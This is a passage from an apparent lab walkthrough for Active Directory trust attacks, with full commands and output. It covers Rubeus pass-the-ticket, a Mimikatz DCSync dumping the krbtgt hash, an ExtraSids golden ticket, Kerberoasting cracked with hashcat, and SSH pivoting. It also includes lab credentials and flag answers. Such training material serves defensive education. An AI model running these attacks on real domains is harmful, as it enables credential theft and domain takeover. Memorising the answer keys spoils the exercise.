  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : 1664EA2C
[*] Domain          : 1L1225OX
[*] Password        : X7XIEVPS
[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1496
[+] LUID            : 0x1692b0
```

Using the newly spawned terminal, students need to request a ticket-granting ticket (TGT) for the user `rita` with the password `rita` for the domain `dev.inlanefreight.ad` and import the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:rita /password:rita /domain:dev.inlanefreight.ad /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /user:rita /password:rita /domain:dev.inlanefreight.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3181B9EC3BEA08B02C139C3E79BAF9B2
[*] Building AS-REQ (w/ preauth) for: 'dev.inlanefreight.ad\rita'
[*] Using domain controller: fe80::35a7:f13:9627:2a17%14:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFkjCCBY6gAwIBBaEDAgEWooIEkzCCBI9hggSLMIIEh6ADAgEFoRYbFERFVi5JTkxBTkVGUkVJR0hU

<SNIP>   

MzA0MVqmERgPMjAyNDA0MjUyMzMwNDFapxEYDzIwMjQwNTAyMTMzMDQxWqgWGxRERVYuSU5MQU5FRlJF
      SUdIVC5BRKkpMCegAwIBAqEgMB4bBmtyYnRndBsUZGV2LmlubGFuZWZyZWlnaHQuYWQ=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/dev.inlanefreight.ad
  ServiceRealm             :  DEV.INLANEFREIGHT.AD
  UserName                 :  rita
  UserRealm                :  DEV.INLANEFREIGHT.AD
  StartTime                :  4/25/2024 8:30:41 AM
  EndTime                  :  4/25/2024 6:30:41 PM
  RenewTill                :  5/2/2024 8:30:41 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  COqW1VoqmzohtkIMYliWWQ==
  ASREP (key)              :  3181B9EC3BEA08B02C139C3E79BAF9B2
```

Subsequently, students need to import `PowerView.ps1` and use the `Add-DomainGroupMember` cmdlet to add `rita` to the `Infrastructure` group as a member.

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Add-DomainGroupMember -Identity 'Infrastructure' -Members 'DEV\rita' -Domain inlanefreight.ad -Verbose
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Add-DomainGroupMember -Identity 'Infrastructure' -Members 'DEV\rita' -Domain inlanefreight.ad -Verbose

VERBOSE: [Get-PrincipalContext] Binding to domain 'inlanefreight.ad'
VERBOSE: [Get-PrincipalContext] Binding to domain 'dev.INLANEFREIGHT.AD'
VERBOSE: [Add-DomainGroupMember] Adding member 'DEV\rita' to group 'Infrastructure'
```

Right after the successful modification, students can proceed to grab the flag:

Code: powershell

```powershell
type \\DC01\Infrastructure_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\Infrastructure_flag\flag.txt

07a3bbe15f607be2aafa9724f808056e
```

Answer: `07a3bbe15f607be2aafa9724f808056e`

# Abusing Foreign Groups & ACL Principals

## Question 3

### "Abuse the Foreign Group membership of the user "jerry" and submit the flag value located at "\\\\DC01\\Inlanefreight\_flag\\flag.txt" (The flag is accessible by the "inlanefreight\\Inlanefreight\_admins" group)"

With the previously established RDP session, students need to open `PowerShell`, navigate to `C:\Tools`, and use `Rubeus.exe` to spawn a `PowerShell` session:

Code: powershell

```powershell
cd C:\Tools
.\Rubeus.exe createnetonly /program:powershell /show
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : YDCGKZIA
[*] Domain          : 6TWR6V22
[*] Password        : M734E03V
[+] Process         : 'powershell' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 6168
[+] LUID            : 0xced63
```

Within the newly spawned `PowerShell` terminal, they will proceed to use `Rubeus.exe` to request a ticket-granting ticket (TGT) for the user `jerry` with the password `jerry` which will be imported into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:jerry /password:jerry /domain:dev.inlanefreight.ad /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /user:jerry /password:jerry /domain:dev.inlanefreight.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 7C4EE43396C9A7B9EE52CED09DB516EA
[*] Building AS-REQ (w/ preauth) for: 'dev.inlanefreight.ad\jerry'
[*] Using domain controller: fe80::8cff:9eaa:a44e:78f2%14:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIF9DCCBfCgAwIBBaEDAgEWooIE9DCCBPBhggTsMIIE6KADAgEFoRYbFERFVi5JTkxBTkVGUkVJR0hU

<SNIP>

MlqnERgPMjAyNDA1MDMwNTE4MDJaqBYbFERFVi5JTkxBTkVGUkVJR0hULkFEqSkwJ6ADAgECoSAwHhsG
      a3JidGd0GxRkZXYuaW5sYW5lZnJlaWdodC5hZA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/dev.inlanefreight.ad
  ServiceRealm             :  DEV.INLANEFREIGHT.AD
  UserName                 :  jerry
  UserRealm                :  DEV.INLANEFREIGHT.AD
  StartTime                :  4/26/2024 12:18:02 AM
  EndTime                  :  4/26/2024 10:18:02 AM
  RenewTill                :  5/3/2024 12:18:02 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  vn79AFT4EtMyClwOPKS9Tw==
  ASREP (key)              :  7C4EE43396C9A7B9EE52CED09DB516EA
```

With the ticket in memory, students can proceed to grab the flag:

Code: powershell

```powershell
type \\DC01\Inlanefreight_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\Inlanefreight_flag\flag.txt

b4fcf05d5e35fed1f6a27afe53be2695
```

Answer: `b4fcf05d5e35fed1f6a27afe53be2695`

# ExtraSids Attack

## Question 1

### "Perform the "Extrasids" attack to compromise DC01. What is the value of the flag file at at "C:\\Users\\Administrator\\Desktop\\flag.txt" in DC01?"

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-1akrtch4ne]─[~]
└──╼ [★]$ xfreerdp /v:10.129.237.96 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.237.96:3389) 
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.237.96:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to open `PowerShell`, navigate to `C:\Tools`, and use `mimikatz.exe` to obtain `krbtgt`'s NTLM hash, carrying out a DCSync attack:

Code: powershell

```powershell
cd C:\Tools
.\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:DEV\krbtgt
[DC] 'dev.INLANEFREIGHT.AD' will be the domain
[DC] 'DC02.dev.INLANEFREIGHT.AD' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 5/15/2023 5:39:11 AM
Object Security ID   : S-1-5-21-2901893446-2198612369-2488268719-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 992093609707726257e0959ce3e23771
    ntlm- 0: 992093609707726257e0959ce3e23771
    lm  - 0: 3491756dfc7414817b971dff2e4a7834

<SNIP>
```

Students will have to note down the `NTLM` hash which will be used later. Subsequently, they need to import `PowerView.ps1` to query the SIDs of the domain `inlanfreight.ad` and the `Enterprise Admins` group:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
Get-ADGroup -Identity "Enterprise Admins" -Server "inlanefreight.ad"
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID
S-1-5-21-2901893446-2198612369-2488268719

PS C:\Tools> Get-ADGroup -Identity "Enterprise Admins" -Server "inlanefreight.ad"

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=AD
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : caa39c09-cb6e-4021-936f-afabfa6af908
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-2879935145-656083549-3766571964-519
```

Having obtained the hash of the `krbtgt` account, the SIDs of the domain `inlanefreight.ad`, and `Enterprise Admins`, students will carry out a `golden ticket` attack using `Rubeus.exe`:

Code: powershell

```powershell
.\Rubeus.exe golden /rc4:992093609707726257e0959ce3e23771 /domain:dev.inlanefreight.ad /sid:S-1-5-21-2901893446-2198612369-2488268719 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt
```

```
PS C:\Tools> .\Rubeus.exe golden /rc4:992093609707726257e0959ce3e23771 /domain:dev.inlanefreight.ad /sid:S-1-5-21-2901893446-2198612369-2488268719 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DEV.INLANEFREIGHT.AD (DEV)
[*] SID            : S-1-5-21-2901893446-2198612369-2488268719
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-2879935145-656083549-3766571964-519
[*] ServiceKey     : 992093609707726257E0959CE3E23771
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 992093609707726257E0959CE3E23771
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : dev.inlanefreight.ad

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dev.inlanefreight.ad'

[*] AuthTime       : 4/26/2024 1:45:17 AM
[*] StartTime      : 4/26/2024 1:45:17 AM
[*] EndTime        : 4/26/2024 11:45:17 AM
[*] RenewTill      : 5/3/2024 1:45:17 AM

[*] base64(ticket.kirbi):

      doIF7TCCBemgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRYbFERFVi5JTkxBTkVGUkVJR0hU

<SNIP>

 MDI0MDUwMzA2NDE0N1qoFhsUREVWLklOTEFORUZSRUlHSFQuQUSpKTAnoAMCAQKhIDAeGwZrcmJ0Z3Qb
      FGRldi5pbmxhbmVmcmVpZ2h0LmFk

[+] Ticket successfully imported!
```

With the ticket imported into memory, they can proceed to grab the flag:

Code: powershell

```powershell
type \\DC01\c$\Users\Administrator\Desktop\flag.txt
```

```
PS C:\Tools> type \\DC01\c$\Users\Administrator\Desktop\flag.txt

6e2fb9d60348eed39d7033f414ce0c7c
```

Answer: `6e2fb9d60348eed39d7033f414ce0c7c`

# Attacking Cross Forest Trusts

## Question 1

### "Authenticate to DC01.inlanefreight.ad (172.16.118.3) and perform Kerberoasting on the user "pirate" within the the logistics.ad domain. What is the user's password?"

After spawning the target students will have to utilize `SSH` to create a dynamic port forwarding with the credentials `Administrator:Test@123`:

Code: shell

```shell
ssh -D 9050 Administrator@STMIP
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-oueyjddrwl]─[~]
└──╼ [★]$ ssh -D 9050 Administrator@10.129.38.188

The authenticity of host '10.129.38.188 (10.129.38.188)' can't be established.
ECDSA key fingerprint is SHA256:ymhpv5dvyTmqO+Iq4zNh/Q4bdf6z9s9uA/ZofCP/fBs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.38.188' (ECDSA) to the list of known hosts.
Administrator@10.129.38.188's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

administrator@SQL01 C:\Users\Administrator>
```

In a separate terminal tab, students will have to connect to `DC01.inlanefreight.ad` (`172.16.118.3`) using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-oueyjddrwl]─[~]
└──╼ [★]$ proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution

[10:37:52:373] [3775:3777] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[10:37:52:373] [3775:3777] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[10:37:52:374] [3775:3777] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[10:37:53:549] [3775:3777] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[10:37:53:549] [3775:3777] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.ad
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.16.118.3:3389) 
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - Common Name (CN):
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - 	DC01.inlanefreight.ad
[10:37:53:549] [3775:3777] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.118.3:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.ad
	Subject:     CN = DC01.inlanefreight.ad
	Issuer:      CN = DC01.inlanefreight.ad
	Thumbprint:  4f:08:98:37:cd:0c:b7:af:7e:30:a9:82:b8:21:29:e1:eb:a1:fb:85:7a:ea:50:76:da:fe:d5:d1:9b:b7:c7:b0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, they will have to open `PowerShell`, navigate to `C:\Tools`, and use `Rubeus.exe` to perform a Kerberoasting attack against the user `pirate`:

Code: powershell

```powershell
cd C:\Tools
.\Rubeus.exe kerberoast /user:pirate /domain:logistics.ad /outfile:kerberoast.txt /nowrap
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\Rubeus.exe kerberoast /user:pirate /domain:logistics.ad /outfile:kerberoast.txt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : pirate
[*] Target Domain          : logistics.ad
[*] Searching path 'LDAP://DC02.logistics.ad/DC=logistics,DC=ad' for '(&(samAccountType=805306368)(servicePrincipalName=
*)(samAccountName=pirate)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : pirate
[*] DistinguishedName      : CN=pirate,CN=Users,DC=logistics,DC=ad
[*] ServicePrincipalName   : Pirate/001.logistics.ad:1433
[*] PwdLastSet             : 4/5/2024 2:53:32 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\kerberoast.txt

[*] Roasted hashes written to : C:\Tools\kerberoast.txt
```

Right after, students have obtained the hash, they will proceed to copy the hash and use the Linux workstation to crack the hash using `hashcat`.

Code: shell

```shell
echo -n '$krb5tgs$23$*pirate$logistics.ad$Pirate/001.logistics.ad:1433@logistics.ad*$1F393341D51B830203B357D661F8661A$6717FD69C7C3A7CD845A6FF8E8828C9E7DFF2944F14E7C7464D2F88396C1DBDB6BD3E6BF5F6A4309AF27BA0D7BEB63CB657785E19EEFA422A880969A84356D1B57018B3871D25502DE34C0B46190444AD687EF47A91D48E8D24E9C47B6251C9A8EE7FEB497764C2758EE71176DDF6A87BF5F21336A30CF794CCC78B3999DE54E60107BBEA4ABAA324EBB2E3D60469E66EB725967526022B043B9C3CAA09B7E74CD8BCD60AA5DA19FF017C77C9F31FC6BD79582F3274746FB312F5E84F143116CEFB3B26EC79FF31C077E6A274F0E2559E4360B28DFE24744CB44E28F50E29D5270EF6F406F53DF15075DF8D4164A3760B2936238CA1969A57046617E53B16F261CD7BB961063BC35512B2B0B8BF8424C7CC6DF68903151075344068202948BBB8F728E182ACA10B730F50F45AD40824F6435DBD51FDBF4E775AA5E3E2B7C16A84F286C09C224D98536B147342FE0631352DD5DD165F83296105DCE4EBCCA008E2B4C7282E0EC05E7F70A2DAD8B744258096F28EB436B44E126A054FB3ABBA6FCD1479DA9E5259F7FCD5660C02BBA0BBAC662C24D66310C26F52389C7AFB66142632103DE319ACD6C6BBD5EF3D2FE8B51FA6D90818672F06A7C1E7FD511D159BE51DE8C384932CA43E70D504B4CC5B515632E5841B04E67AF0CE5492D3DB4F4CB74D4D6A2483FF3E15BCE7CD4364989C90BD45EA62C5510BF9788E1E8E5887620A21148BE310DFDD09E094388076C0BDCC48C6908F42C21322CF1D259E88DBAFD747948D1F4ACB1D309FBFCF4723B9421149E1F777474A8149965476E9ACD0BB4A57847545CAE593554E703039472B2F07A0AF001F97914A182D44E941226E9176E557C42BAAF9051E86F55653F35285E7E9F1AB6440D3B933388A1786546142D1E0C9759E51486C4B05C9C4060544D16904CFC1677359764C633106AC6C105EBBAD5849C3BD07A5B10CF3C272D4DA957B7DD07874E480445D14EEA6793C52AA1331EFF8F0EB5FD9869937816B424635BC2E87592207EF6E5188C7A411944AFD98B1C60C0036C4931CBC551A4A5B944368A5E1B2409E204BB5D6ADD2BC492F462163DF8FEE438A435DA97019062681C11B5CE197CCB203C77347AFD6794E37E716CA9A1C113A807284873EBF92D20D37175C0B1218EF36A379C33061FC68E07024B28DA08EB8939D1A229C08B855FCF66C46BA3F66FB69FD6E77AC5204E4C7EE9817DF15278D5CA575269C83B561D2545693EF64512DD2EECBC13B7B235856E51576816BD4B4AC3BAD87B83BCDF9B44EF66AAAA285137D5C29807D727F4F90F39958792C2381B3619D2A54364E15547446324ECA7E7959DF64ECDF2F3AE0959D4BE153CB80839D6E2784BB8F27C1F2FE8B91F8652A1BFDDE918305478A49759FA8AE8B511C54256686AB5D6456E6B3F7905D0D1CE8D88763CC7C12723929DB49333CFA88D53F54825D1356D708D26F0B6729053D034373A53C289CD02C1B3E738B1B600350B72F7753FC316E0283E0EADFE9A363336F3D154A7022A56B664AD763347FE289DC8D8FE482C053DDC7570E686FB6336F1064335E04C51EEB90A28E601325FF99C110E7A' > pirate.hash
hashcat -m 13100 pirate.hash /usr/share/wordlists/rockyou.txt 
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-oueyjddrwl]─[~]
└──╼ [★]$ echo -n '$krb5tgs$23$*pirate$logistics.ad$Pirate/001.logistics.ad:1433@logistics.ad*$1F393341D51B830203B357D661F8661A$6717FD69C7C3A7CD845A6FF8E8828C9E7DFF2944F14E7C7464D2F88396C1DBDB6BD3E6BF5F6A4309AF27BA0D7BEB63CB657785E19EEFA422A880969A84356D1B57018B3871D25502DE34C0B46190444AD687EF47A91D48E8D24E9C47B6251C9A8EE7FEB497764C2758EE71176DDF6A87BF5F21336A30CF794CCC78B3999DE54E60107BBEA4ABAA324EBB2E3D60469E66EB725967526022B043B9C3CAA09B7E74CD8BCD60AA5DA19FF017C77C9F31FC6BD79582F3274746FB312F5E84F143116CEFB3B26EC79FF31C077E6A274F0E2559E4360B28DFE24744CB44E28F50E29D5270EF6F406F53DF15075DF8D4164A3760B2936238CA1969A57046617E53B16F261CD7BB961063BC35512B2B0B8BF8424C7CC6DF68903151075344068202948BBB8F728E182ACA10B730F50F45AD40824F6435DBD51FDBF4E775AA5E3E2B7C16A84F286C09C224D98536B147342FE0631352DD5DD165F83296105DCE4EBCCA008E2B4C7282E0EC05E7F70A2DAD8B744258096F28EB436B44E126A054FB3ABBA6FCD1479DA9E5259F7FCD5660C02BBA0BBAC662C24D66310C26F52389C7AFB66142632103DE319ACD6C6BBD5EF3D2FE8B51FA6D90818672F06A7C1E7FD511D159BE51DE8C384932CA43E70D504B4CC5B515632E5841B04E67AF0CE5492D3DB4F4CB74D4D6A2483FF3E15BCE7CD4364989C90BD45EA62C5510BF9788E1E8E5887620A21148BE310DFDD09E094388076C0BDCC48C6908F42C21322CF1D259E88DBAFD747948D1F4ACB1D309FBFCF4723B9421149E1F777474A8149965476E9ACD0BB4A57847545CAE593554E703039472B2F07A0AF001F97914A182D44E941226E9176E557C42BAAF9051E86F55653F35285E7E9F1AB6440D3B933388A1786546142D1E0C9759E51486C4B05C9C4060544D16904CFC1677359764C633106AC6C105EBBAD5849C3BD07A5B10CF3C272D4DA957B7DD07874E480445D14EEA6793C52AA1331EFF8F0EB5FD9869937816B424635BC2E87592207EF6E5188C7A411944AFD98B1C60C0036C4931CBC551A4A5B944368A5E1B2409E204BB5D6ADD2BC492F462163DF8FEE438A435DA97019062681C11B5CE197CCB203C77347AFD6794E37E716CA9A1C113A807284873EBF92D20D37175C0B1218EF36A379C33061FC68E07024B28DA08EB8939D1A229C08B855FCF66C46BA3F66FB69FD6E77AC5204E4C7EE9817DF15278D5CA575269C83B561D2545693EF64512DD2EECBC13B7B235856E51576816BD4B4AC3BAD87B83BCDF9B44EF66AAAA285137D5C29807D727F4F90F39958792C2381B3619D2A54364E15547446324ECA7E7959DF64ECDF2F3AE0959D4BE153CB80839D6E2784BB8F27C1F2FE8B91F8652A1BFDDE918305478A49759FA8AE8B511C54256686AB5D6456E6B3F7905D0D1CE8D88763CC7C12723929DB49333CFA88D53F54825D1356D708D26F0B6729053D034373A53C289CD02C1B3E738B1B600350B72F7753FC316E0283E0EADFE9A363336F3D154A7022A56B664AD763347FE289DC8D8FE482C053DDC7570E686FB6336F1064335E04C51EEB90A28E601325FF99C110E7A' > pirate.hash 

┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-oueyjddrwl]─[~]
└──╼ [★]$ hashcat -m 13100 pirate.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7542 32-Core Processor, 7854/7918 MB (1979 MB allocatable), 4MCU

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
* Device #2: pthread-AMD EPYC 7542 32-Core Processor, skipped

<SNIP>

$krb5tgs$23$*pirate$logistics.ad$Pirate/001.logistics.ad:1433@logistics.ad*$1f393<SNIP>f99c110e7a:killer
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*pirate$logistics.ad$Pirate/001.logisti...110e7a
Time.Started.....: Fri Apr 26 10:44:05 2024 (0 secs)
Time.Estimated...: Fri Apr 26 10:44:05 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1664.6 kH/s (7.95ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Fri Apr 26 10:43:42 2024
Stopped: Fri Apr 26 10:44:06 2024
```

Answer: `killer`

# Trust Account Attack

## Question 1

### "Authenticate to DC02.logistics.ad (172.16.118.252) using SSH. What is the password for the user 'white.beard' residing in the MegaCorp domain?"

After spawning the target students will have to utilize `SSH` to create a dynamic port forwarding with the credentials `Administrator:Test@123`:

Code: shell

```shell
ssh -D 9050 Administrator@STMIP
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-oueyjddrwl]─[~]
└──╼ [★]$ ssh -D 9050 Administrator@10.129.38.188

The authenticity of host '10.129.38.188 (10.129.38.188)' can't be established.
ECDSA key fingerprint is SHA256:ymhpv5dvyTmqO+Iq4zNh/Q4bdf6z9s9uA/ZofCP/fBs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.38.188' (ECDSA) to the list of known hosts.
Administrator@10.129.38.188's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

administrator@SQL01 C:\Users\Administrator>
```

Having established the tunnel, students will proceed to open a new terminal tab and connect to `DC02.logistics.ad` (`172.16.118.252`) via SSH with the credentials `Administrator:L0gistics_adm!`:

Code: shell

```shell
proxychains -q ssh Administrator@172.16.118.252
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-iplgz2mvla]─[~]
└──╼ [★]$ proxychains -q ssh Administrator@172.16.118.252

The authenticity of host '172.16.118.252 (172.16.118.252)' can't be established.
ECDSA key fingerprint is SHA256:xOTs1GIP6IszUpcwK4+1zv31sMmBmKdtwAHStR7Fepc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.118.252' (ECDSA) to the list of known hosts.
Administrator@172.16.118.252's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

